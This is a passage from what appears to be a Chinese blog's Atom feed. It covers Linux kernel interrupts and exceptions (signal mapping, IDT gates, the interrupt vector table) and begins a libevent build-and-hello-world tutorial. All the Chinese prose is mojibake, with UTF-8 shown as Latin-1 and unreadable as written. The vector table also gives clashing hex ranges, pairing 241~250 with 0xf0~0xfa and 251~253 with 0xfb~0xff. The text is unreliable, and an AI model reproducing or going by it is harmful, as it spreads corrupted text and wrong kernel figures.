â€œFloating point errorâ€ï¼ˆæ•…éšœï¼‰ï¼šé›†æˆåˆ°CPUèŠ¯ç‰‡ä¸­çš„æµ®ç‚¹å•å…ƒç”¨ä¿¡å·é€šçŸ¥ä¸€ä¸ªé”™è¯¯æƒ…å½¢ï¼Œå¦‚æ•°å­—æº¢å‡ºï¼Œæˆ–è¢«0é™¤</li><li>17 â€œAlignment checkâ€ï¼ˆæ•…éšœï¼‰ï¼šæ“ä½œæ•°çš„åœ°å€æ²¡æœ‰è¢«æ­£ç¡®çš„å¯¹é½</li><li>18 â€œMachine checkâ€ï¼ˆå¼‚å¸¸ä¸­æ­¢ï¼‰ï¼šæœºå™¨æ£€æŸ¥æœºåˆ¶æ£€æµ‹åˆ°ä¸€ä¸ªCPUé”™è¯¯æˆ–æ€»çº¿é”™è¯¯</li><li>19 â€œSIMD floating point exceptionâ€ï¼ˆæ•…éšœï¼‰ï¼šé›†æˆåˆ°CPUèŠ¯ç‰‡ä¸­çš„SSEæˆ–SSE2å•å…ƒå¯¹æµ®ç‚¹æ“ä½œç”¨ä¿¡å·é€šçŸ¥ä¸€ä¸ªé”™è¯¯æƒ…å½¢</li><li>20ï½31è¿™äº›å€¼ç”±Intelç•™ä½œå°†æ¥å¼€å‘</li></ul><div class="table-container"><table><thead><tr><th>ç¼–å·</th><th>å¼‚å¸¸</th><th>å¼‚å¸¸å¤„ç†ç¨‹åº</th><th>ä¿¡å·</th></tr></thead><tbody><tr><td>0</td><td>Divide error</td><td>divide_error()</td><td>SIGFPE</td></tr><tr><td>1</td><td>Debug</td><td>debug()</td><td>SIGTRAP</td></tr><tr><td>2</td><td>NMI</td><td>nmi()</td><td>None</td></tr><tr><td>3</td><td>Breakpoint</td><td>int3()</td><td>SIGTRAP</td></tr><tr><td>4</td><td>Overflow</td><td>overflow()</td><td>SIGSEGV</td></tr><tr><td>5</td><td>Bounds check</td><td>bounds()</td><td>SIGSEGV</td></tr><tr><td>6</td><td>Invalid opcode</td><td>invalid_op()</td><td>SIGILL</td></tr><tr><td>7</td><td>Device not available</td><td>device_not_available()</td><td>None</td></tr><tr><td>8</td><td>Double fault</td><td>doublefault_fn()</td><td>None</td></tr><tr><td>9</td><td>Coprocessor segment overrun</td><td>coprocessor_segment_overrun()</td><td>SIGFPE</td></tr><tr><td>10</td><td>Invalid TSS</td><td>invalid_tss()</td><td>SIGSEGV</td></tr><tr><td>11</td><td>Segment not present</td><td>segment_not_present()</td><td>SIGBUS</td></tr><tr><td>12</td><td>Stack exception</td><td>stack_segment()</td><td>SIGBUS</td></tr><tr><td>13</td><td>General protection</td><td>general_protection()</td><td>SIGSEGV</td></tr><tr><td>14</td><td>Page fault</td><td>page_fault()</td><td>SIGSEGV</td></tr><tr><td>15</td><td>Intel reserved</td><td>None</td><td>None</td></tr><tr><td>16</td><td>Floating point error</td><td>coprocessor_error()</td><td>SIGFPE</td></tr><tr><td>17</td><td>Alignment check</td><td>alignment_check()</td><td>SIGSEGV</td></tr><tr><td>18</td><td>Machine check</td><td>machine_check()</td><td>None</td></tr><tr><td>19</td><td>SIMD floating point</td><td>simd_coprocessor_error()</td><td>SIGFPE</td></tr></tbody></table></div><h4 id="ä¸­æ–­æè¿°ç¬¦è¡¨"><a href="#ä¸­æ–­æè¿°ç¬¦è¡¨" class="headerlink" title="ä¸­æ–­æè¿°ç¬¦è¡¨"></a>ä¸­æ–­æè¿°ç¬¦è¡¨</h4><p>ä¸­æ–­æè¿°ç¬¦è¡¨(Interrupt Descriptor Table,IDT)æ˜¯ä¸€ä¸ªç³»ç»Ÿè¡¨ï¼Œå®ƒä¸æ¯ä¸€ä¸ªä¸­æ–­æˆ–å¼‚å¸¸å‘é‡ç›¸è”ç³»ï¼Œæ¯ä¸€ä¸ªå‘é‡åœ¨è¡¨ä¸­æœ‰ç›¸åº”çš„ä¸­æ–­æˆ–å¼‚å¸¸å¤„ç†ç¨‹åºçš„å…¥å£åœ°å€ã€‚å†…æ ¸åœ¨å…è®¸ä¸­æ–­å‘ç”Ÿå‰ï¼Œå¿…é¡»é€‚å½“çš„åˆå§‹åŒ–IDT</p><p>IDTåŒ…å«ä¸‰ç§ç±»å‹çš„æè¿°ç¬¦ï¼Œä¸‹å›¾æ˜¾ç¤ºäº†æ¯ç§æè¿°ç¬¦ä¸­çš„64ä½çš„å«ä¹‰ï¼Œå€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œåœ¨40ï½43ä½çš„Typeå­—æ®µçš„å€¼è¡¨ç¤ºæè¿°ç¬¦çš„ç±»å‹ã€‚</p><p><img src="/2021/11/23/æ·±å…¥ç†è§£linuxå†…æ ¸ä¹‹ä¸­æ–­å’Œå¼‚å¸¸/1.png" alt="1"></p><ul><li>ä»»åŠ¡é—¨(task gate)ï¼šå½“ä¸­æ–­ä¿¡å·å‘ç”Ÿæ—¶ï¼Œå¿…é¡»å–ä»£å½“å‰è¿›ç¨‹çš„é‚£ä¸ªè¿›ç¨‹çš„TSSé€‰æ‹©ç¬¦æ”¾åœ¨ä»»åŠ¡é—¨ä¸­</li><li>ä¸­æ–­é—¨(interrupt gate)ï¼šåŒ…å«æ®µé€‰æ‹©ç¬¦å’Œä¸­æ–­æˆ–å¼‚å¸¸å¤„ç†ç¨‹åºçš„æ®µå†…åç§»é‡ã€‚å½“æ§åˆ¶æƒè½¬ç§»åˆ°ä¸€ä¸ªé€‚å½“çš„æ®µæ—¶ï¼Œå¤„ç†å™¨æ¸…IFæ ‡å¿—ï¼Œä»è€Œå…³é—­å°†æ¥ä¼šå‘ç”Ÿçš„å¯å±è”½ä¸­æ–­</li><li>é™·é˜±é—¨(Trap gate)ï¼šä¸ä¸­æ–­é—¨ç›¸ä¼¼ï¼Œåªæ˜¯æ§åˆ¶æƒä¼ é€’åˆ°ä¸€ä¸ªé€‚å½“çš„æ®µæ—¶å¤„ç†å™¨ä¸ä¿®æ”¹IFæ ‡å¿—</li></ul><h4 id="å¼‚å¸¸å¤„ç†"><a href="#å¼‚å¸¸å¤„ç†" class="headerlink" title="å¼‚å¸¸å¤„ç†"></a>å¼‚å¸¸å¤„ç†</h4><p>CPUäº§ç”Ÿçš„å¤§éƒ¨åˆ†å¼‚å¸¸éƒ½ç”±Linuxè§£é‡Šä¸ºå‡ºé”™æ¡ä»¶ï¼Œå½“å…¶ä¸­ä¸€ä¸ªå¼‚å¸¸å‘ç”Ÿæ—¶ï¼Œå†…æ ¸å°±å‘å¼•èµ·å¼‚å¸¸çš„è¿›ç¨‹å‘é€ä¸€ä¸ªä¿¡å·å‘å®ƒé€šçŸ¥ä¸€ä¸ªåå¸¸æ¡ä»¶ï¼Œä¾‹å¦‚ï¼Œå¦‚æœè¿›ç¨‹æ‰§è¡Œäº†ä¸€ä¸ªè¢«0é™¤çš„æ“ä½œï¼ŒCPUå°±äº§ç”Ÿä¸€ä¸ªâ€Divide errorâ€å¼‚å¸¸ï¼Œå¹¶ç”±ç›¸åº”çš„å¼‚å¸¸å¤„ç†ç¨‹åºå‘å½“å‰è¿›ç¨‹å‘é€ä¸€ä¸ªSIGFPEä¿¡å·ï¼Œè¿™ä¸ªè¿›ç¨‹å°†é‡‡å–è‹¥å¹²å¿…è¦çš„æ­¥éª¤æ¥æ¢å¤æˆ–è€…ä¸­æ­¢è¿è¡Œã€‚</p><p>å¼‚å¸¸å¤„ç†ç¨‹åºæœ‰ä¸€ä¸ªæ ‡å‡†çš„ç»“æ„ï¼Œç”±ä»¥ä¸‹ä¸‰éƒ¨åˆ†ç»„æˆ</p><ul><li>åœ¨å†…æ ¸å †æ ˆä¸­ä¿å­˜å¤§å¤šæ•°å¯„å­˜å™¨çš„å†…å®¹</li><li>ç”¨é«˜çº§çš„Cå‡½æ•°å¤„ç†å¼‚å¸¸</li><li>é€šè¿‡<code>ret_from_exception()</code>å‡½æ•°ä»å¼‚å¸¸ç¨‹åºé€€å‡º</li></ul><p>ä¸ºäº†åˆ©ç”¨å¼‚å¸¸ï¼Œå¿…é¡»å¯¹IDTè¿›è¡Œé€‚å½“çš„åˆå§‹åŒ–ï¼Œä½¿å¾—æ¯ä¸ªè¢«ç¡®è®¤çš„å¼‚å¸¸éƒ½æœ‰ä¸€ä¸ªå¼‚å¸¸å¤„ç†ç¨‹åºã€‚<code>trap_init()</code>å‡½æ•°çš„å·¥ä½œæ—¶å°†ä¸€äº›æœ€ç»ˆå€¼(å³å¤„ç†å¼‚å¸¸çš„å‡½æ•°)æ’å…¥åˆ°IDTçš„éå±è”½ä¸­æ–­åŠå¼‚å¸¸è¡¨é¡¹ä¸­ï¼Œè¿™æ˜¯ç”±å‡½æ•°<code>set_trap_gate()</code>ã€<code>set_intr_gate()</code>ã€<code>set_system_intr_gate()</code>å’Œ<code>set_task_gate()</code>æ¥å®Œæˆçš„</p><h4 id="ä¸­æ–­å¤„ç†"><a href="#ä¸­æ–­å¤„ç†" class="headerlink" title="ä¸­æ–­å¤„ç†"></a>ä¸­æ–­å¤„ç†</h4><p>ä¸­æ–­å¤„ç†ä¾èµ–äºä¸­æ–­ç±»å‹ï¼Œç›®å‰ä¸»è¦æœ‰ä¸‰ç§ä¸»è¦çš„ä¸­æ–­ç±»å‹ã€‚</p><ul><li>I/Oä¸­æ–­ï¼šæŸäº›I/Oè®¾å¤‡éœ€è¦å…³æ³¨ï¼Œç›¸åº”çš„ä¸­æ–­å¤„ç†ç¨‹åºå¿…é¡»æŸ¥è¯¢è®¾å¤‡ä»¥ç¡®å®šé€‚å½“çš„æ“ä½œè¿‡ç¨‹</li><li>æ—¶é’Ÿä¸­æ–­ï¼šæŸäº›æ—¶é’Ÿäº§ç”Ÿä¸€ä¸ªä¸­æ–­ï¼Œè¿™ç§ä¸­æ–­å‘Šè¯‰å†…æ ¸ä¸€ä¸ªå›ºå®šçš„æ—¶é—´é—´éš”å·²ç»è¿‡å»</li><li>å¤„ç†å™¨ä¸­æ–­ï¼šå¤šå¤„ç†å™¨ç³»ç»Ÿä¸­ä¸€ä¸ªCPUå¯¹å¦ä¸€ä¸ªCPUå‘å‡ºä¸€ä¸ªä¸­æ–­</li></ul><h4 id="I-Oä¸­æ–­å¤„ç†"><a href="#I-Oä¸­æ–­å¤„ç†" class="headerlink" title="I/Oä¸­æ–­å¤„ç†"></a>I/Oä¸­æ–­å¤„ç†</h4><p>ä¸­æ–­å¤„ç†ç¨‹åºçš„çµæ´»æ€§æ˜¯ä»¥ä¸¤ç§ä¸åŒçš„æ–¹å¼å®ç°çš„</p><ul><li>IRQå…±äº«ï¼šä¸­æ–­å¤„ç†ç¨‹åºæ‰§è¡Œå¤šä¸ªä¸­æ–­æœåŠ¡ä¾‹ç¨‹(interrupt service routineï¼ŒISR)ï¼Œæ¯ä¸ªISRæ˜¯ä¸€ä¸ªä¸å•ç‹¬è®¾å¤‡(å…±äº«IRQçº¿)ç›¸å…³çš„å‡½æ•°ã€‚å› ä¸ºä¸å¯èƒ½é¢„å…ˆçŸ¥é“å“ªä¸ªç‰¹å®šçš„è®¾å¤‡äº§ç”ŸIRQï¼Œå› æ­¤ï¼Œæ¯ä¸ªISRéƒ½è¢«æ‰§è¡Œï¼Œä»¥éªŒè¯å®ƒçš„è®¾å¤‡æ˜¯å¦éœ€è¦å…³æ³¨ï¼Œå¦‚æœæ˜¯ï¼Œå½“è®¾å¤‡äº§ç”Ÿä¸­æ–­æ—¶ï¼Œå°±æ‰§è¡Œéœ€è¦æ‰§è¡Œçš„æ‰€æœ‰æ“ä½œã€‚</li><li>IRQåŠ¨æ€åˆ†é…ï¼šä¸€æ¡IRQçº¿åœ¨å¯èƒ½çš„æœ€åæ—¶åˆ»æ‰ä¸ä¸€ä¸ªè®¾å¤‡é©±åŠ¨ç¨‹åºç›¸å…³è”ï¼Œä¾‹å¦‚ï¼Œè½¯ç›˜è®¾å¤‡çš„IRQçº¿åªæœ‰åœ¨ç”¨æˆ·è®¿é—®è½¯ç›˜è®¾å¤‡æ—¶æ‰è¢«åˆ†é…ã€‚è¿™æ ·ï¼Œå³ä½¿å‡ ä¸ªç¡¬ä»¶è®¾å¤‡å¹¶ä¸å…±äº«IRQçº¿ï¼ŒåŒä¸€ä¸ªIRQå‘é‡ä¹Ÿå¯ä»¥ç”±è¿™å‡ ä¸ªè®¾å¤‡åœ¨ä¸åŒæ—¶åˆ»ä½¿ç”¨ã€‚</li></ul><p>å½“ä¸€ä¸ªä¸­æ–­å‘ç”Ÿæ—¶ï¼Œå¹¶ä¸æ˜¯æ‰€æœ‰çš„æ“ä½œéƒ½å…·æœ‰ç›¸åŒçš„æ€¥è¿«æ€§ã€‚äº‹å®ä¸Šï¼ŒæŠŠæ‰€æœ‰çš„æ“ä½œéƒ½æ”¾è¿›ä¸­æ–­å¤„ç†ç¨‹åºæœ¬èº«å¹¶ä¸åˆé€‚ï¼Œéœ€è¦æ—¶é—´é•¿çš„ã€éé‡è¦çš„æ“ä½œåº”è¯¥æ¨åï¼Œå› ä¸ºå½“ä¸€ä¸ªä¸­æ–­å¤„ç†ç¨‹åºæ­£åœ¨è¿è¡Œæ—¶ï¼Œç›¸åº”çš„IRQçº¿ä¸Šå‘å‡ºçš„ä¿¡å·å°±è¢«æš‚æ—¶å¿½ç•¥ã€‚æ›´é‡è¦çš„æ˜¯ï¼Œä¸­æ–­å¤„ç†ç¨‹åºæ˜¯ä»£è¡¨è¿›ç¨‹æ‰§è¡Œçš„ï¼Œå®ƒæ‰€ä»£è¡¨çš„è¿›ç¨‹å¿…é¡»æ€»å¤„äº<code>TASK_RUNNING</code>çŠ¶æ€ï¼Œå¦åˆ™ï¼Œå°±å¯èƒ½å‡ºç°ç³»ç»Ÿåƒµæ­»æƒ…å½¢ã€‚å› æ­¤ï¼Œä¸­æ–­å¤„ç†ç¨‹åºä¸èƒ½æ‰§è¡Œä»»ä½•é˜»å¡è¿‡ç¨‹ã€‚å¦‚ç£ç›˜I/Oæ“ä½œï¼Œå› æ­¤LinuxæŠŠç´§éšä¸­æ–­è¦æ‰§è¡Œçš„æ“ä½œåˆ†ä¸ºä¸‰ç±»</p><ul><li>ç´§æ€¥çš„ï¼ˆCriticalï¼‰ï¼šè¿™æ ·çš„æ“ä½œè¯¸å¦‚ï¼šå¯¹PICåº”ç­”ä¸­æ–­ï¼Œå¯¹PICæˆ–è®¾å¤‡æ§åˆ¶å™¨é‡ç¼–ç¨‹ï¼Œæˆ–è€…ä¿®æ”¹ç”±è®¾å¤‡å’Œå¤„ç†å™¨åŒæ—¶è®¿é—®çš„æ•°æ®ç»“æ„ï¼Œè¿™äº›éƒ½èƒ½è¢«å¾ˆå¿«åœ°æ‰§è¡Œï¼Œè€Œä¹‹æ‰€ä»¥è¯´å®ƒä»¬æ˜¯ç´§æ€¥çš„æ˜¯å› ä¸ºä»–ä»¬å¿…é¡»è¢«å°½å¿«çš„æ‰§è¡Œã€‚ç´§æ€¥æ“ä½œè¦åœ¨ä¸€ä¸ªä¸­æ–­å¤„ç†ç¨‹åºå†…ç«‹å³æ‰§è¡Œï¼Œè€Œä¸”æ˜¯åœ¨ç¦æ­¢å¯å±è”½ä¸­æ–­çš„æƒ…å†µä¸‹ã€‚</li><li>éç´§æ€¥çš„ï¼ˆNoncriticalï¼‰ï¼šè¿™æ ·çš„æ“ä½œè¯¸å¦‚ä¿®æ”¹é‚£äº›åªæœ‰å¤„ç†å™¨æ‰ä¼šè®¿é—®çš„æ•°æ®ç»“æ„ï¼Œè¿™äº›æ“ä½œä¹Ÿè¦å¾ˆå¿«åœ°å®Œæˆï¼Œå› æ­¤ï¼Œå®ƒä»¬ç”±ä¸­æ–­å¤„ç†ç¨‹åºç«‹å³æ‰§è¡Œï¼Œä½†å¿…é¡»æ˜¯åœ¨å¼€ä¸­æ–­çš„æƒ…å†µä¸‹ã€‚</li><li>éç´§æ€¥å¯å»¶è¿Ÿçš„ï¼ˆNoncritical deferrableï¼‰ï¼šè¿™æ ·çš„æ“ä½œä¾‹å¦‚æŠŠç¼“å†²åŒºçš„å†…å®¹æ‹·è´åˆ°æŸä¸ªè¿›ç¨‹çš„åœ°å€ç©ºé—´ã€‚è¿™äº›æ“ä½œå¯èƒ½è¢«å»¶è¿Ÿè¾ƒé•¿çš„æ—¶é—´é—´éš”è€Œä¸å½±å“å†…æ ¸æ“ä½œã€‚</li></ul><p>ä¸ç®¡å¼•èµ·ä¸­æ–­çš„ç”µè·¯ç§ç±»å¦‚ä½•ï¼Œæ‰€æœ‰çš„I/Oä¸­æ–­å¤„ç†ç¨‹åºéƒ½æ‰§è¡Œå››ä¸ªç›¸åŒçš„åŸºæœ¬æ“ä½œ</p><ul><li>åœ¨å†…æ ¸æ€å †æ ˆä¸­ä¿å­˜IRQçš„å€¼å’Œå¯„å­˜å™¨çš„å†…å®¹</li><li>ä¸ºæ­£åœ¨ç»™IRQçº¿æœåŠ¡çš„PICå‘é€ä¸€ä¸ªåº”ç­”ï¼Œè¿™å°†å…è®¸PICè¿›ä¸€æ­¥å‘å‡ºä¸­æ–­</li><li>æ‰§è¡Œå…±äº«è¿™ä¸ªIRQçš„æ‰€æœ‰è®¾å¤‡çš„ä¸­æ–­æœåŠ¡ä¾‹ç¨‹(ISR)</li><li>è·³åˆ°<code>ret_from_intr()</code>çš„åœ°å€åç»ˆæ­¢</li></ul><p>Linuxä¸­çš„ä¸­æ–­å‘é‡</p><div class="table-container"><table><thead><tr><th>å‘é‡èŒƒå›´</th><th>ç”¨é€”</th></tr></thead><tbody><tr><td>0ï½19(0x0~0x13)</td><td>éå±è”½ä¸­æ–­å’Œå¼‚å¸¸</td></tr><tr><td>20~31(0x14~0x1f)</td><td>Intelä¿ç•™</td></tr><tr><td>32~127(0x20~0x7f)</td><td>å¤–éƒ¨ä¸­æ–­(IRQ)</td></tr><tr><td>128(0x80)</td><td>ç”¨äºç³»ç»Ÿè°ƒç”¨çš„å¯ç¼–ç¨‹å¼‚å¸¸</td></tr><tr><td>129~238(0x81~0xee)</td><td>å¤–éƒ¨ä¸­æ–­(IRQ)</td></tr><tr><td>239(0xef)</td><td>æœ¬åœ°APICæ—¶é’Ÿä¸­æ–­</td></tr><tr><td>240(0xf0)</td><td>æœ¬åœ°APICé«˜æ¸©ä¸­æ–­</td></tr><tr><td>241~250(0xf0~0xfa)</td><td>ç”±Linuxç•™ä½œå°†æ¥ä½¿ç”¨</td></tr><tr><td>251~253(0xfb~0xff)</td><td>å¤„ç†å™¨é—´ä¸­æ–­</td></tr><tr><td>254(0xfe)</td><td>æœ¬åœ°APICé”™è¯¯ä¸­æ–­</td></tr><tr><td>255(0xff)</td><td>æœ¬åœ°APICä¼ªä¸­æ–­</td></tr></tbody></table></div>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h4&gt;&lt;p&gt;ä¸­æ–­é€šå¸¸è¢«å®šä¹‰ä¸ºä¸€ä¸ªäº‹ä»¶ï¼Œè¯¥äº‹ä»¶æ”¹å˜å¤„ç†å™¨æ‰§è¡Œçš„æŒ‡ä»¤é¡ºåºã€‚è¿™æ ·çš„äº‹ä»¶ä¸CPUèŠ¯ç‰‡å†…å¤–éƒ¨ç¡¬ä»¶ç”µè·¯äº§ç”Ÿçš„ç”µä¿¡å·ç›¸å¯¹åº”ã€‚&lt;/p&gt;
&lt;p&gt;ä¸­æ–­é€šå¸¸åˆ†
      
    
    </summary>
    
    
      <category term="Linux" scheme="elssm.github.io/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>æµ…å­¦libevent</title>
    <link href="elssm.github.io/2021/11/19/%E6%B5%85%E5%AD%A6libevent/"/>
    <id>elssm.github.io/2021/11/19/æµ…å­¦libevent/</id>
    <published>2021-11-19T06:17:46.000Z</published>
    <updated>2021-12-13T09:52:46.659Z</updated>
    
    <content type="html"><![CDATA[<h4 id="libeventç®€ä»‹"><a href="#libeventç®€ä»‹" class="headerlink" title="libeventç®€ä»‹"></a>libeventç®€ä»‹</h4><p><code>libevent</code>æ˜¯ä¸€ä¸ªç”¨Cè¯­è¨€ç¼–å†™çš„è½»é‡çº§çš„å¼€æºé«˜æ€§èƒ½äº‹ä»¶é€šçŸ¥åº“ï¼Œæ”¯æŒå¤šç§I/Oå¤šè·¯å¤ç”¨æŠ€æœ¯ï¼Œæ”¯æŒå®šæ—¶å™¨å’Œä¿¡å·ç­‰äº‹ä»¶ï¼Œè€Œä¸”æ˜¯è·¨å¹³å°çš„ã€‚</p><h4 id="libeventç‰¹ç‚¹"><a href="#libeventç‰¹ç‚¹" class="headerlink" title="libeventç‰¹ç‚¹"></a>libeventç‰¹ç‚¹</h4><ul><li>äº‹ä»¶é©±åŠ¨ï¼Œé«˜æ€§èƒ½</li><li>è½»é‡çº§ï¼Œä¸“æ³¨äºç½‘ç»œ</li><li>è·¨å¹³å°ï¼Œæ”¯æŒ<code>Windows</code>ã€<code>Linux</code>ã€<code>MacOs</code>ç­‰</li><li><p>æ”¯æŒå¤šç§I/Oå¤šè·¯å¤ç”¨æŠ€æœ¯ï¼Œ<code>epoll</code>ã€<code>poll</code>ã€<code>dev/poll</code>ã€<code>select</code>å’Œ<code>kqueue</code>ç­‰</p></li><li><p>æ”¯æŒI/Oï¼Œå®šæ—¶å™¨å’Œä¿¡å·ç­‰äº‹ä»¶</p></li></ul><h4 id="libeventä¸‹è½½åŠå®‰è£…"><a href="#libeventä¸‹è½½åŠå®‰è£…" class="headerlink" title="libeventä¸‹è½½åŠå®‰è£…"></a>libeventä¸‹è½½åŠå®‰è£…</h4><p>ä¸‹è½½åœ°å€ï¼š<a href="https://libevent.org/" target="_blank" rel="noopener">https://libevent.org/</a></p><p>è¿™é‡Œæˆ‘ä¸‹è½½çš„æ˜¯<code>libevent-2.1.8-stable.tar.gz</code>ï¼Œä¸‹è½½ä¹‹åè§£å‹ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -zxvf libevent-2.1.8-stable.tar.gz</span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥è¿›è¡Œæºç åŒ…å®‰è£…ï¼Œè¿™ä¸€æ­¥çš„ç›®çš„æ˜¯æ£€æŸ¥å®‰è£…ç¯å¢ƒï¼Œç”Ÿæˆmakefile</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./configure</span><br></pre></td></tr></table></figure><p>ä¹‹åæ‰§è¡Œ<code>make</code>å‘½ä»¤ç”Ÿæˆ<code>.o</code>å¯æ‰§è¡Œæ–‡ä»¶ï¼Œæœ€åæ‰§è¡Œ<code>sudo make install</code>å°†å¿…è¦èµ„æºæ”¾ç½®ç³»ç»ŸæŒ‡å®šç›®å½•</p><h4 id="éªŒè¯libeventå®‰è£…"><a href="#éªŒè¯libeventå®‰è£…" class="headerlink" title="éªŒè¯libeventå®‰è£…"></a>éªŒè¯libeventå®‰è£…</h4><p>è¿›å…¥<code>libevent-2.1.8-stable</code>ä¸‹çš„<code>sample</code>ç›®å½•ï¼Œgccç¼–è¯‘<code>hello-world.c</code>æ–‡ä»¶</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc hello-world.c -o hello</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªæ—¶å€™ä¼šå‡ºç°æŠ¥é”™å¦‚ä¸‹ï¼Œæ˜¾ç¤ºæœªå®šä¹‰å¼•ç”¨</p><p><img src="/2021/11/19/æµ…å­¦libevent/1.png" alt="1"></p><p>å‡ºç°ä¸Šè¿°æŠ¥é”™æ˜¯å› ä¸ºæˆ‘ä»¬æ²¡æœ‰æŒ‡å®šåº“åï¼Œå› æ­¤éœ€è¦åŠ <code>-l</code>é€‰é¡¹</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc hello-world.c -o hello -l event</span><br></pre></td></tr></table></figure><p><code>hello</code>æ–‡ä»¶æ˜¯ä¸€ä¸ªç®€å•çš„æœåŠ¡å™¨ç¨‹åºï¼Œç«¯å£æ˜¯<code>9995</code>ï¼Œæˆ‘ä»¬å°è¯•è¿è¡Œ<code>hello</code>ï¼Œå®ƒä¼šç­‰å¾…å®¢æˆ·ç«¯çš„è¿æ¥ã€‚å¹¶å‘å®¢æˆ·ç«¯å‘é€<code>Hello,World</code>å­—ç¬¦ä¸²ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼Œè¯æ˜<code>libevent</code>åº“å®‰è£…æˆåŠŸã€‚</p><p><img src="/2021/11/19/æµ…å­¦libevent/2.png" alt="2"></p><p><code>libevent</code>åº“çš„å®‰è£…ä½ç½®åœ¨<code>/usr/local/lib</code>è·¯å¾„ä¸‹</p><p><img src="/2021/11/19/æµ…å­¦libevent/3.png" alt="3"></p><h4 id="Hello-worldåˆ†æ"><a href="#Hello-worldåˆ†æ" class="headerlink" title="Hello-worldåˆ†æ"></a>Hello-worldåˆ†æ</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  This example program provides a trivial server program that listens for TCP</span></span><br><span class="line"><span class="comment">  connections on port 9995.  When they arrive, it writes a short message to</span></span><br><span class="line"><span class="comment">  each client connection, and closes each connection once it is flushed.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  Where possible, it exits cleanly in response to a SIGINT (ctrl-c).</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> _WIN32</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">ifdef</span> _XOPEN_SOURCE_EXTENDED</span></span><br><span 